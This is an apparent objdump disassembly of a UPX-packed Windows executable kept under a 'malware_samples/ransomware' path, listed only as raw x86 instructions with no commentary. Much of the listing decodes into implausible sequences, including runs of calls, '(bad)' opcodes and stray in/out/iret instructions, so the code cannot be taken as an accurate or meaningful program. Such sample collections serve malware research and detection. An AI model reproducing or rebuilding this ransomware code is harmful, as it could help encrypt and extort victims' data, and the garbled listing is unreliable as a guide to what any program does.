
malware_samples/ransomware/79aaceccb8865b4d31fda778be72f42296928d8ae81c201c6d3a0a4db72f6635.exe:     file format pei-i386


Disassembly of section UPX0:

00401000 <UPX0>:
  401000:	e8 fb 5f 00 00       	call   0x407000
  401005:	e8 2b 60 00 00       	call   0x407035
  40100a:	e8 5c 60 00 00       	call   0x40706b
  40100f:	e8 8d 60 00 00       	call   0x4070a1
  401014:	83 c4 0c             	add    $0xc,%esp
  401017:	e8 f5 60 00 00       	call   0x407111
  40101c:	e8 26 61 00 00       	call   0x407147
  401021:	e8 91 61 00 00       	call   0x4071b7
  401026:	e8 c2 61 00 00       	call   0x4071ed
  40102b:	e8 f3 61 00 00       	call   0x407223
  401030:	e8 24 62 00 00       	call   0x407259
  401035:	e8 55 62 00 00       	call   0x40728f
  40103a:	e8 c0 62 00 00       	call   0x4072ff
  40103f:	e8 f1 62 00 00       	call   0x407335
  401044:	e8 24 65 00 00       	call   0x40756d
  401049:	e8 ff 65 00 00       	call   0x40764d
  40104e:	e8 06 69 00 00       	call   0x407959
  401053:	e8 d9 69 00 00       	call   0x407a31
  401058:	e8 b0 6a 00 00       	call   0x407b0d
  40105d:	e8 e1 6a 00 00       	call   0x407b43
  401062:	ef                   	out    %eax,(%dx)
  401063:	e8 15 6b 00 00       	call   0x407b7d
  401068:	e8 eb 6d 00 00       	call   0x407e58
  40106d:	f3 e8 1f 6e 00 00    	repz call 0x407e92
  401073:	52                   	push   %edx
  401074:	50                   	push   %eax
  401075:	5b                   	pop    %ebx
  401076:	5f                   	pop    %edi
  401077:	83 ff ff             	cmp    $0xffffffff,%edi
  40107a:	7f 0b                	jg     0x401087
  40107c:	7c 05                	jl     0x401083
  40107e:	83 fb ff             	cmp    $0xffffffff,%ebx
  401081:	77 04                	ja     0x401087
  401083:	31 c0                	xor    %eax,%eax
  401085:	eb 05                	jmp    0x40108c
  401087:	e8 bf 74 00 00       	call   0x40854b
  40108c:	09 c0                	or     %eax,%eax
  40108e:	74 0b                	je     0x40109b
  401090:	e8 d8 d4 00 00       	call   0x40e56d
  401095:	28 e8                	sub    %ch,%al
  401097:	0c d5                	or     $0xd5,%al
  401099:	00 00                	add    %al,(%eax)
  40109b:	e8 e1 74 00 00       	call   0x408581
  4010a0:	e8 12 75 00 00       	call   0x4085b7
  4010a5:	3f                   	aas
  4010a6:	e8 46 75 00 00       	call   0x4085f1
  4010ab:	e8 77 75 00 00       	call   0x408627
  4010b0:	89 c3                	mov    %eax,%ebx
  4010b2:	21 db                	and    %ebx,%ebx
  4010b4:	75 0f                	jne    0x4010c5
  4010b6:	e8 85 b6 00 00       	call   0x40c740
  4010bb:	e8 b6 b6 00 00       	call   0x40c776
  4010c0:	e8 e7 b6 00 00       	call   0x40c7ac
  4010c5:	e8 ac b3 00 00       	call   0x40c476
  4010ca:	e8 dd b3 00 00       	call   0x40c4ac
  4010cf:	e8 52 b5 00 00       	call   0x40c626
  4010d4:	c6                   	(bad)
  4010d5:	e8 86 b5 00 00       	call   0x40c660
  4010da:	e8 f1 b5 00 00       	call   0x40c6d0
  4010df:	e8 fe b3 00 00       	call   0x40c4e2
  4010e4:	e8 2f b4 00 00       	call   0x40c518
  4010e9:	c3                   	ret
  4010ea:	53                   	push   %ebx
  4010eb:	31 c0                	xor    %eax,%eax
  4010ed:	50                   	push   %eax
  4010ee:	50                   	push   %eax
  4010ef:	50                   	push   %eax
  4010f0:	50                   	push   %eax
  4010f1:	8b 54 24 18          	mov    0x18(%esp),%edx
  4010f5:	8d 0c 24             	lea    (%esp),%ecx
  4010f8:	e8 e5 b6 00 00       	call   0x40c7e2
  4010fd:	e8 2c b8 00 00       	call   0x40c92e
  401102:	ff 74 24 04          	push   0x4(%esp)
  401106:	e8 59 b8 00 00       	call   0x40c964
  40110b:	e8 8a b8 00 00       	call   0x40c99a
  401110:	89 44 24 04          	mov    %eax,0x4(%esp)
  401114:	e8 60 be 00 00       	call   0x40cf79
  401119:	e8 91 be 00 00       	call   0x40cfaf
  40111e:	20 ff                	and    %bh,%bh
  401120:	74 24                	je     0x401146
  401122:	04 e8                	add    $0xe8,%al
  401124:	63 bf 00 00 21 c0    	arpl   %edi,-0x3fdf0000(%edi)
  40112a:	e8 77 c0 00 00       	call   0x40d1a6
  40112f:	bd e8 fb c1 00       	mov    $0xc1fbe8,%ebp
  401134:	00 50 50             	add    %dl,0x50(%eax)
  401137:	ff 74 24 0c          	push   0xc(%esp)
  40113b:	e8 26 c2 00 00       	call   0x40d366
  401140:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401144:	50                   	push   %eax
  401145:	e8 64 c3 00 00       	call   0x40d4ae
  40114a:	ff 74 24 08          	push   0x8(%esp)
  40114e:	e8 91 c3 00 00       	call   0x40d4e4
  401153:	59                   	pop    %ecx
  401154:	e8 c1 c3 00 00       	call   0x40d51a
  401159:	74 04                	je     0x40115f
  40115b:	31 c0                	xor    %eax,%eax
  40115d:	eb 05                	jmp    0x401164
  40115f:	e8 8e c4 00 00       	call   0x40d5f2
  401164:	21 c0                	and    %eax,%eax
  401166:	74 25                	je     0x40118d
  401168:	ff 74 24 08          	push   0x8(%esp)
  40116c:	e8 24 d3 00 00       	call   0x40e495
  401171:	59                   	pop    %ecx
  401172:	e8 54 d3 00 00       	call   0x40e4cb
  401177:	74 04                	je     0x40117d
  401179:	31 c0                	xor    %eax,%eax
  40117b:	eb 05                	jmp    0x401182
  40117d:	e8 7f d3 00 00       	call   0x40e501
  401182:	21 c0                	and    %eax,%eax
  401184:	74 07                	je     0x40118d
  401186:	e8 ac d3 00 00       	call   0x40e537
  40118b:	eb 02                	jmp    0x40118f
  40118d:	31 c0                	xor    %eax,%eax
  40118f:	21 c0                	and    %eax,%eax
  401191:	e8 92 c4 00 00       	call   0x40d628
  401196:	6b ff 74             	imul   $0x74,%edi,%edi
  401199:	24 04                	and    $0x4,%al
  40119b:	e8 f8 c4 00 00       	call   0x40d698
  4011a0:	89 c3                	mov    %eax,%ebx
  4011a2:	83 fb 01             	cmp    $0x1,%ebx
  4011a5:	75 4c                	jne    0x4011f3
  4011a7:	e8 2a c8 00 00       	call   0x40d9d6
  4011ac:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4011b0:	e8 57 c8 00 00       	call   0x40da0c
  4011b5:	e8 88 c8 00 00       	call   0x40da42
  4011ba:	ce                   	into
  4011bb:	8b 54 24 04          	mov    0x4(%esp),%edx
  4011bf:	e8 b8 c8 00 00       	call   0x40da7c
  4011c4:	d2 e8                	shr    %cl,%al
  4011c6:	ec                   	in     (%dx),%al
  4011c7:	c8 00 00 e8          	enter  $0x0,$0xe8
  4011cb:	1d c9 00 00 e8       	sbb    $0xe80000c9,%eax
  4011d0:	4e                   	dec    %esi
  4011d1:	c9                   	leave
  4011d2:	00 00                	add    %al,(%eax)
  4011d4:	8b 54 24 10          	mov    0x10(%esp),%edx
  4011d8:	e8 7b c9 00 00       	call   0x40db58
  4011dd:	e8 ac c9 00 00       	call   0x40db8e
  4011e2:	76 01                	jbe    0x4011e5
  4011e4:	14 24                	adc    $0x24,%al
  4011e6:	e8 dd c9 00 00       	call   0x40dbc8
  4011eb:	e8 6b d2 00 00       	call   0x40e45b
  4011f0:	0c eb                	or     $0xeb,%al
  4011f2:	58                   	pop    %eax
  4011f3:	e8 46 c5 00 00       	call   0x40d73e
  4011f8:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4011fc:	e8 73 c5 00 00       	call   0x40d774
  401201:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401205:	83 fb 01             	cmp    $0x1,%ebx
  401208:	75 41                	jne    0x40124b
  40120a:	e8 9b c5 00 00       	call   0x40d7aa
  40120f:	3b e8                	cmp    %eax,%ebp
  401211:	cf                   	iret
  401212:	c5 00                	lds    (%eax),%eax
  401214:	00 8b 54 24 08 e8    	add    %cl,-0x17f7dbac(%ebx)
  40121a:	fc                   	cld
  40121b:	c5 00                	lds    (%eax),%eax
  40121d:	00 95 e8 30 c6 00    	add    %dl,0xc630e8(%ebp)
  401223:	00 e8                	add    %ch,%al
  401225:	61                   	popa
  401226:	c6 00 00             	movb   $0x0,(%eax)
  401229:	e8 92 c6 00 00       	call   0x40d8c0
  40122e:	8b 54 24 14          	mov    0x14(%esp),%edx
  401232:	e8 bf c6 00 00       	call   0x40d8f6
  401237:	e8 f0 c6 00 00       	call   0x40d92c
  40123c:	85 01                	test   %eax,(%ecx)
  40123e:	14 24                	adc    $0x24,%al
  401240:	e8 21 c7 00 00       	call   0x40d966
  401245:	e8 52 c7 00 00       	call   0x40d99c
  40124a:	7a e8                	jp     0x401234
  40124c:	12 c4                	adc    %ah,%al
  40124e:	00 00                	add    %al,(%eax)
  401250:	ff 74 24 04          	push   0x4(%esp)
  401254:	e8 87 bf 00 00       	call   0x40d1e0
  401259:	31 c0                	xor    %eax,%eax
  40125b:	ff 34 24             	push   (%esp)
  40125e:	e8 86 bd 00 00       	call   0x40cfe9
  401263:	ff 74 24 08          	push   0x8(%esp)
  401267:	e8 b3 bd 00 00       	call   0x40d01f
  40126c:	ff 74 24 0c          	push   0xc(%esp)
  401270:	e8 e0 bd 00 00       	call   0x40d055
  401275:	83 c4 10             	add    $0x10,%esp
  401278:	5b                   	pop    %ebx
  401279:	c2 08 00             	ret    $0x8
  40127c:	53                   	push   %ebx
  40127d:	e8 7c c9 00 00       	call   0x40dbfe
  401282:	83 ec 04             	sub    $0x4,%esp
  401285:	e8 aa c9 00 00       	call   0x40dc34
  40128a:	7d 05                	jge    0x401291
  40128c:	4a                   	dec    %edx
  40128d:	75 f3                	jne    0x401282
  40128f:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  401293:	8d 0c 24             	lea    (%esp),%ecx
  401296:	e8 d4 c9 00 00       	call   0x40dc6f
  40129b:	ff 34 24             	push   (%esp)
  40129e:	e8 02 ca 00 00       	call   0x40dca5
  4012a3:	e8 33 ca 00 00       	call   0x40dcdb
  4012a8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4012ac:	e8 60 ca 00 00       	call   0x40dd11
  4012b1:	74 3c                	je     0x4012ef
  4012b3:	ff 74 24 04          	push   0x4(%esp)
  4012b7:	e8 8b d0 00 00       	call   0x40e347
  4012bc:	89 44 24 08          	mov    %eax,0x8(%esp)
  4012c0:	ff 74 24 08          	push   0x8(%esp)
  4012c4:	e8 b4 d0 00 00       	call   0x40e37d
  4012c9:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4012cd:	ff 74 24 08          	push   0x8(%esp)
  4012d1:	ff 74 24 10          	push   0x10(%esp)
  4012d5:	ff 74 24 0c          	push   0xc(%esp)
  4012d9:	e8 d5 d0 00 00       	call   0x40e3b3
  4012de:	ff 74 24 04          	push   0x4(%esp)
  4012e2:	e8 02 d1 00 00       	call   0x40e3e9
  4012e7:	e8 33 d1 00 00       	call   0x40e41f
  4012ec:	0f 44 4b e8          	cmove  -0x18(%ebx),%ecx
  4012f0:	53                   	push   %ebx
  4012f1:	ca 00 00             	lret   $0x0
  4012f4:	50                   	push   %eax
  4012f5:	50                   	push   %eax
  4012f6:	e8 82 ca 00 00       	call   0x40dd7d
  4012fb:	91                   	xchg   %eax,%ecx
  4012fc:	e8 b6 ca 00 00       	call   0x40ddb7
  401301:	e8 e7 ca 00 00       	call   0x40dded
  401306:	6f                   	outsl  %ds:(%esi),(%dx)
  401307:	e8 1b cb 00 00       	call   0x40de27
  40130c:	e8 4c cb 00 00       	call   0x40de5d
  401311:	c4 01                	les    (%ecx),%eax
  401313:	54                   	push   %esp
  401314:	24 04                	and    $0x4,%al
  401316:	e8 7c cb 00 00       	call   0x40de97
  40131b:	e8 ad cb 00 00       	call   0x40decd
  401320:	57                   	push   %edi
  401321:	89 44 24 04          	mov    %eax,0x4(%esp)
  401325:	e8 dd cb 00 00       	call   0x40df07
  40132a:	74 38                	je     0x401364
  40132c:	ff 74 24 04          	push   0x4(%esp)
  401330:	e8 3a cf 00 00       	call   0x40e26f
  401335:	89 44 24 14          	mov    %eax,0x14(%esp)
  401339:	ff 74 24 14          	push   0x14(%esp)
  40133d:	e8 63 cf 00 00       	call   0x40e2a5
  401342:	89 44 24 18          	mov    %eax,0x18(%esp)
  401346:	ff 74 24 14          	push   0x14(%esp)
  40134a:	ff 74 24 1c          	push   0x1c(%esp)
  40134e:	ff 74 24 0c          	push   0xc(%esp)
  401352:	e8 84 cf 00 00       	call   0x40e2db
  401357:	ff 74 24 04          	push   0x4(%esp)
  40135b:	e8 b1 cf 00 00       	call   0x40e311
  401360:	ff 44 24 10          	incl   0x10(%esp)
  401364:	ff 34 24             	push   (%esp)
  401367:	e8 d1 cb 00 00       	call   0x40df3d
  40136c:	e8 02 cc 00 00       	call   0x40df73
  401371:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401375:	e8 2f cc 00 00       	call   0x40dfa9
  40137a:	74 10                	je     0x40138c
  40137c:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  401380:	83 fb 02             	cmp    $0x2,%ebx
  401383:	75 07                	jne    0x40138c
  401385:	e8 af ce 00 00       	call   0x40e239
  40138a:	eb 02                	jmp    0x40138e
  40138c:	31 c0                	xor    %eax,%eax
  40138e:	21 c0                	and    %eax,%eax
  401390:	74 59                	je     0x4013eb
  401392:	e8 b4 cc 00 00       	call   0x40e04b
  401397:	6d                   	insl   (%dx),%es:(%edi)
  401398:	e8 e8 cc 00 00       	call   0x40e085
  40139d:	66 e8 1c cd          	callw  0xe0bd
  4013a1:	00 00                	add    %al,(%eax)
  4013a3:	8d 44 24 24          	lea    0x24(%esp),%eax
  4013a7:	50                   	push   %eax
  4013a8:	e8 48 cd 00 00       	call   0x40e0f5
  4013ad:	ff 74 24 14          	push   0x14(%esp)
  4013b1:	ff 74 24 1c          	push   0x1c(%esp)
  4013b5:	ff 74 24 24          	push   0x24(%esp)
  4013b9:	e8 6d cd 00 00       	call   0x40e12b
  4013be:	e8 9e cd 00 00       	call   0x40e161
  4013c3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4013c7:	50                   	push   %eax
  4013c8:	ff 74 24 24          	push   0x24(%esp)
  4013cc:	e8 c6 cd 00 00       	call   0x40e197
  4013d1:	ff 74 24 08          	push   0x8(%esp)
  4013d5:	ff 74 24 10          	push   0x10(%esp)
  4013d9:	ff 74 24 24          	push   0x24(%esp)
  4013dd:	e8 eb cd 00 00       	call   0x40e1cd
  4013e2:	ff 74 24 1c          	push   0x1c(%esp)
  4013e6:	e8 18 ce 00 00       	call   0x40e203
  4013eb:	31 c0                	xor    %eax,%eax
  4013ed:	ff 34 24             	push   (%esp)
  4013f0:	e8 ea cb 00 00       	call   0x40dfdf
  4013f5:	ff 74 24 20          	push   0x20(%esp)
  4013f9:	e8 17 cc 00 00       	call   0x40e015
  4013fe:	83 c4 24             	add    $0x24,%esp
  401401:	5b                   	pop    %ebx
  401402:	c2 04 00             	ret    $0x4
  401405:	53                   	push   %ebx
  401406:	31 c0                	xor    %eax,%eax
  401408:	50                   	push   %eax
  401409:	50                   	push   %eax
  40140a:	50                   	push   %eax
  40140b:	8b 44 24 18          	mov    0x18(%esp),%eax
  40140f:	e8 30 95 00 00       	call   0x40a944
  401414:	e8 61 95 00 00       	call   0x40a97a
  401419:	9c                   	pushf
  40141a:	8b 8b 44 24 14 3b    	mov    0x3b142444(%ebx),%ecx
  401420:	04 24                	add    $0x24,%al
  401422:	7c 42                	jl     0x401466
  401424:	e8 6c 96 00 00       	call   0x40aa95
  401429:	e8 9d 96 00 00       	call   0x40aacb
  40142e:	89 c3                	mov    %eax,%ebx
  401430:	83 c3 61             	add    $0x61,%ebx
  401433:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401437:	8b 54 24 08          	mov    0x8(%esp),%edx
  40143b:	e8 c0 9a 00 00       	call   0x40af00
  401440:	42                   	inc    %edx
  401441:	e8 f4 9a 00 00       	call   0x40af3a
  401446:	e8 25 9b 00 00       	call   0x40af70
  40144b:	50                   	push   %eax
  40144c:	50                   	push   %eax
  40144d:	ff 74 24 10          	push   0x10(%esp)
  401451:	e8 50 9b 00 00       	call   0x40afa6
  401456:	58                   	pop    %eax
  401457:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40145b:	50                   	push   %eax
  40145c:	e8 b1 9b 00 00       	call   0x40b012
  401461:	ff 04 24             	incl   (%esp)
  401464:	71 b5                	jno    0x40141b
  401466:	8b 54 24 08          	mov    0x8(%esp),%edx
  40146a:	e8 46 95 00 00       	call   0x40a9b5
  40146f:	16                   	push   %ss
  401470:	e8 7a 95 00 00       	call   0x40a9ef
  401475:	58                   	pop    %eax
  401476:	e8 aa 95 00 00       	call   0x40aa25
  40147b:	1f                   	pop    %ds
  40147c:	eb 0e                	jmp    0x40148c
  40147e:	a1 74 57 40 00       	mov    0x405774,%eax
  401483:	03 05 74 50 40 00    	add    0x405074,%eax
  401489:	c6 00 00             	movb   $0x0,(%eax)
  40148c:	ff 74 24 08          	push   0x8(%esp)
  401490:	e8 ca 95 00 00       	call   0x40aa5f
  401495:	83 c4 0c             	add    $0xc,%esp
  401498:	5b                   	pop    %ebx
  401499:	c2 04 00             	ret    $0x4
  40149c:	53                   	push   %ebx
  40149d:	57                   	push   %edi
  40149e:	e8 ba 71 00 00       	call   0x40865d
  4014a3:	83 ec 04             	sub    $0x4,%esp
  4014a6:	e8 e8 71 00 00       	call   0x408693
  4014ab:	e0 5c                	loopne 0x401509
  4014ad:	4a                   	dec    %edx
  4014ae:	75 f3                	jne    0x4014a3
  4014b0:	e8 19 72 00 00       	call   0x4086ce
  4014b5:	50                   	push   %eax
  4014b6:	50                   	push   %eax
  4014b7:	e8 48 72 00 00       	call   0x408704
  4014bc:	29 e8                	sub    %ebp,%eax
  4014be:	7c 72                	jl     0x401532
  4014c0:	00 00                	add    %al,(%eax)
  4014c2:	e8 b3 77 00 00       	call   0x408c7a
  4014c7:	79 e8                	jns    0x4014b1
  4014c9:	e7 77                	out    %eax,$0x77
  4014cb:	00 00                	add    %al,(%eax)
  4014cd:	e8 18 78 00 00       	call   0x408cea
  4014d2:	4e                   	dec    %esi
  4014d3:	01 54 24 04          	add    %edx,0x4(%esp)
  4014d7:	e8 48 78 00 00       	call   0x408d24
  4014dc:	e8 72 7f 00 00       	call   0x409453
  4014e1:	38 89 04 24 ff 34    	cmp    %cl,0x34ff2404(%ecx)
  4014e7:	24 e8                	and    $0xe8,%al
  4014e9:	a0 7f 00 00 52       	mov    0x5200007f,%al
  4014ee:	50                   	push   %eax
  4014ef:	8f 44 24 08          	pop    0x8(%esp)
  4014f3:	8f 44 24 08          	pop    0x8(%esp)
  4014f7:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4014fb:	e8 dd 80 00 00       	call   0x4095dd
  401500:	a3 ff 74 24 10       	mov    %eax,0x102474ff
  401505:	ff 74 24 10          	push   0x10(%esp)
  401509:	83 04 24 01          	addl   $0x1,(%esp)
  40150d:	e8 1b 82 00 00       	call   0x40972d
  401512:	8f 44 24 10          	pop    0x10(%esp)
  401516:	8f 44 24 10          	pop    0x10(%esp)
  40151a:	ff 74 24 10          	push   0x10(%esp)
  40151e:	ff 74 24 10          	push   0x10(%esp)
  401522:	5b                   	pop    %ebx
  401523:	5f                   	pop    %edi
  401524:	3b 7c 24 08          	cmp    0x8(%esp),%edi
  401528:	7c 0c                	jl     0x401536
  40152a:	7f 06                	jg     0x401532
  40152c:	3b 5c 24 04          	cmp    0x4(%esp),%ebx
  401530:	72 04                	jb     0x401536
  401532:	31 c0                	xor    %eax,%eax
  401534:	eb 05                	jmp    0x40153b
  401536:	e8 28 82 00 00       	call   0x409763
  40153b:	09 c0                	or     %eax,%eax
  40153d:	75 08                	jne    0x401547
  40153f:	e8 f6 ae 00 00       	call   0x40c43a
  401544:	9f                   	lahf
  401545:	d4 45                	aam    $0x45
  401547:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40154b:	21 db                	and    %ebx,%ebx
  40154d:	e8 47 82 00 00       	call   0x409799
  401552:	8c ff                	mov    %?,%edi
  401554:	74 24                	je     0x40157a
  401556:	10 ff                	adc    %bh,%bh
  401558:	74 24                	je     0x40157e
  40155a:	10 ff                	adc    %bh,%bh
  40155c:	74 24                	je     0x401582
  40155e:	08 e8                	or     %ch,%al
  401560:	9f                   	lahf
  401561:	84 00                	test   %al,(%eax)
  401563:	00 e8                	add    %ch,%al
  401565:	26 86 00             	xchg   %al,%es:(%eax)
  401568:	00 50 50             	add    %dl,0x50(%eax)
  40156b:	e8 55 86 00 00       	call   0x409bc5
  401570:	e8 86 86 00 00       	call   0x409bfb
  401575:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401579:	50                   	push   %eax
  40157a:	e8 1e 87 00 00       	call   0x409c9d
  40157f:	e8 0b 89 00 00       	call   0x409e8f
  401584:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401588:	50                   	push   %eax
  401589:	ff 74 24 08          	push   0x8(%esp)
  40158d:	e8 33 89 00 00       	call   0x409ec5
  401592:	e8 b7 8c 00 00       	call   0x40a24e
  401597:	53                   	push   %ebx
  401598:	e8 eb 8c 00 00       	call   0x40a288
  40159d:	f2 e8 1f 8d 00 00    	bnd call 0x40a2c2
  4015a3:	8d 44 24 20          	lea    0x20(%esp),%eax
  4015a7:	50                   	push   %eax
  4015a8:	e8 97 8e 00 00       	call   0x40a444
  4015ad:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4015b1:	50                   	push   %eax
  4015b2:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4015b6:	50                   	push   %eax
  4015b7:	e8 be 8e 00 00       	call   0x40a47a
  4015bc:	21 c0                	and    %eax,%eax
  4015be:	74 04                	je     0x4015c4
  4015c0:	31 c0                	xor    %eax,%eax
  4015c2:	eb 05                	jmp    0x4015c9
  4015c4:	e8 c3 8f 00 00       	call   0x40a58c
  4015c9:	21 c0                	and    %eax,%eax
  4015cb:	e8 f2 8f 00 00       	call   0x40a5c2
  4015d0:	2f                   	das
  4015d1:	ff 44 24 20          	incl   0x20(%esp)
  4015d5:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4015d9:	83 fb 02             	cmp    $0x2,%ebx
  4015dc:	e8 1b 90 00 00       	call   0x40a5fc
  4015e1:	8e ff                	mov    %edi,%?
  4015e3:	74 24                	je     0x401609
  4015e5:	10 ff                	adc    %bh,%bh
  4015e7:	74 24                	je     0x40160d
  4015e9:	10 83 04 24 05 e8    	adc    %al,-0x17fadbfc(%ebx)
  4015ef:	43                   	inc    %ebx
  4015f0:	90                   	nop
  4015f1:	00 00                	add    %al,(%eax)
  4015f3:	8f 44 24 28          	pop    0x28(%esp)
  4015f7:	8f 44 24 28          	pop    0x28(%esp)
  4015fb:	ff 74 24 08          	push   0x8(%esp)
  4015ff:	ff 74 24 08          	push   0x8(%esp)
  401603:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401607:	8b 10                	mov    (%eax),%edx
  401609:	29 14 24             	sub    %edx,(%esp)
  40160c:	8b 50 04             	mov    0x4(%eax),%edx
  40160f:	19 54 24 04          	sbb    %edx,0x4(%esp)
  401613:	8f 44 24 30          	pop    0x30(%esp)
  401617:	8f 44 24 30          	pop    0x30(%esp)
  40161b:	ff 74 24 30          	push   0x30(%esp)
  40161f:	ff 74 24 30          	push   0x30(%esp)
  401623:	5b                   	pop    %ebx
  401624:	5f                   	pop    %edi
  401625:	83 ff 00             	cmp    $0x0,%edi
  401628:	7f 0b                	jg     0x401635
  40162a:	7c 05                	jl     0x401631
  40162c:	83 fb 05             	cmp    $0x5,%ebx
  40162f:	77 04                	ja     0x401635
  401631:	31 c0                	xor    %eax,%eax
  401633:	eb 05                	jmp    0x40163a
  401635:	e8 32 90 00 00       	call   0x40a66c
  40163a:	09 c0                	or     %eax,%eax
  40163c:	e8 61 90 00 00       	call   0x40a6a2
  401641:	55                   	push   %ebp
  401642:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401646:	50                   	push   %eax
  401647:	e8 cc 90 00 00       	call   0x40a718
  40164c:	89 44 24 34          	mov    %eax,0x34(%esp)
  401650:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401654:	50                   	push   %eax
  401655:	ff 74 24 38          	push   0x38(%esp)
  401659:	ff 74 24 08          	push   0x8(%esp)
  40165d:	e8 5c 91 00 00       	call   0x40a7be
  401662:	e8 8d 91 00 00       	call   0x40a7f4
  401667:	7e e8                	jle    0x401651
  401669:	c1 91 00 00 ce e8 f5 	rcll   $0xf5,-0x17320000(%ecx)
  401670:	91                   	xchg   %eax,%ecx
  401671:	00 00                	add    %al,(%eax)
  401673:	e8 26 92 00 00       	call   0x40a89e
  401678:	55                   	push   %ebp
  401679:	e8 5a 92 00 00       	call   0x40a8d8
  40167e:	e8 8b 92 00 00       	call   0x40a90e
  401683:	58                   	pop    %eax
  401684:	e8 bf 99 00 00       	call   0x40b048
  401689:	e8 f0 99 00 00       	call   0x40b07e
  40168e:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  401692:	50                   	push   %eax
  401693:	e8 1c 9a 00 00       	call   0x40b0b4
  401698:	ff 74 24 38          	push   0x38(%esp)
  40169c:	e8 49 9a 00 00       	call   0x40b0ea
  4016a1:	e8 7a 9a 00 00       	call   0x40b120
  4016a6:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4016aa:	e8 13 9b 00 00       	call   0x40b1c2
  4016af:	74 3a                	je     0x4016eb
  4016b1:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4016b5:	50                   	push   %eax
  4016b6:	ff 74 24 38          	push   0x38(%esp)
  4016ba:	ff 74 24 44          	push   0x44(%esp)
  4016be:	e8 35 9b 00 00       	call   0x40b1f8
  4016c3:	ff 74 24 3c          	push   0x3c(%esp)
  4016c7:	e8 cf 9d 00 00       	call   0x40b49b
  4016cc:	e8 00 9e 00 00       	call   0x40b4d1
  4016d1:	ff 74 24 3c          	push   0x3c(%esp)
  4016d5:	e8 2d 9e 00 00       	call   0x40b507
  4016da:	ff 74 24 38          	push   0x38(%esp)
  4016de:	e8 94 9e 00 00       	call   0x40b577
  4016e3:	e8 16 ad 00 00       	call   0x40c3fe
  4016e8:	e7 e6                	out    %eax,$0xe6
  4016ea:	50                   	push   %eax
  4016eb:	e8 ec 8f 00 00       	call   0x40a6dc
  4016f0:	3f                   	aas
  4016f1:	00 ab 8b 5c 24 14    	add    %ch,0x14245c8b(%ebx)
  4016f7:	83 fb 01             	cmp    $0x1,%ebx
  4016fa:	e8 d4 80 00 00       	call   0x4097d3
  4016ff:	f4                   	hlt
  401700:	ff 34 24             	push   (%esp)
  401703:	e8 05 81 00 00       	call   0x40980d
  401708:	8b 44 24 40          	mov    0x40(%esp),%eax
  40170c:	eb 02                	jmp    0x401710
  40170e:	31 c0                	xor    %eax,%eax
  401710:	ff 74 24 18          	push   0x18(%esp)
  401714:	e8 fe 7e 00 00       	call   0x409617
  401719:	ff 74 24 1c          	push   0x1c(%esp)
  40171d:	e8 9f 7f 00 00       	call   0x4096c1
  401722:	ff 74 24 38          	push   0x38(%esp)
  401726:	e8 cc 7f 00 00       	call   0x4096f7
  40172b:	83 c4 44             	add    $0x44,%esp
  40172e:	5f                   	pop    %edi
  40172f:	5b                   	pop    %ebx
  401730:	c3                   	ret
	...
  401ffd:	00 00                	add    %al,(%eax)
  401fff:	00 52 51             	add    %dl,0x51(%edx)
  402002:	e8 11 a8 00 00       	call   0x40c818
  402007:	c3                   	ret
  402008:	52                   	push   %edx
  402009:	51                   	push   %ecx
  40200a:	e8 a4 5b 00 00       	call   0x407bb3
  40200f:	c3                   	ret
  402010:	e8 c2 50 00 00       	call   0x4070d7
  402015:	e9 e8 62 51 00       	jmp    0x918302
  40201a:	00 ef                	add    %ch,%bh
  40201c:	e8 a4 52 00 00       	call   0x4072c5
  402021:	db e8                	fucomi %st(0),%st
  402023:	6f                   	outsl  %ds:(%esi),(%dx)
  402024:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402025:	00 00                	add    %al,(%eax)
  402027:	61                   	popa
  402028:	e8 d9 a6 00 00       	call   0x40c706
  40202d:	31 cc                	xor    %ecx,%esp
  40202f:	cc                   	int3
  402030:	8b 44 24 08          	mov    0x8(%esp),%eax
  402034:	50                   	push   %eax
  402035:	6a 01                	push   $0x1
  402037:	e8 a0 8f 00 00       	call   0x40afdc
  40203c:	8a 4c 24 04          	mov    0x4(%esp),%cl
  402040:	88 08                	mov    %cl,(%eax)
  402042:	c6 40 01 00          	movb   $0x0,0x1(%eax)
  402046:	c2 08 00             	ret    $0x8
  402049:	cc                   	int3
  40204a:	cc                   	int3
  40204b:	cc                   	int3
  40204c:	cc                   	int3
  40204d:	cc                   	int3
  40204e:	cc                   	int3
  40204f:	cc                   	int3
  402050:	56                   	push   %esi
  402051:	8b 74 24 08          	mov    0x8(%esp),%esi
  402055:	85 f6                	test   %esi,%esi
  402057:	57                   	push   %edi
  402058:	7d 02                	jge    0x40205c
  40205a:	33 f6                	xor    %esi,%esi
  40205c:	8b 44 24 10          	mov    0x10(%esp),%eax
  402060:	50                   	push   %eax
  402061:	56                   	push   %esi
  402062:	e8 ca 7b 00 00       	call   0x409c31
  402067:	85 f6                	test   %esi,%esi
  402069:	8b f8                	mov    %eax,%edi
  40206b:	74 0e                	je     0x40207b
  40206d:	56                   	push   %esi
  40206e:	6a 20                	push   $0x20
  402070:	57                   	push   %edi
  402071:	e8 f1 7b 00 00       	call   0x409c67
  402076:	83 c4 0c             	add    $0xc,%esp
  402079:	03 fe                	add    %esi,%edi
  40207b:	c6 07 00             	movb   $0x0,(%edi)
  40207e:	5f                   	pop    %edi
  40207f:	5e                   	pop    %esi
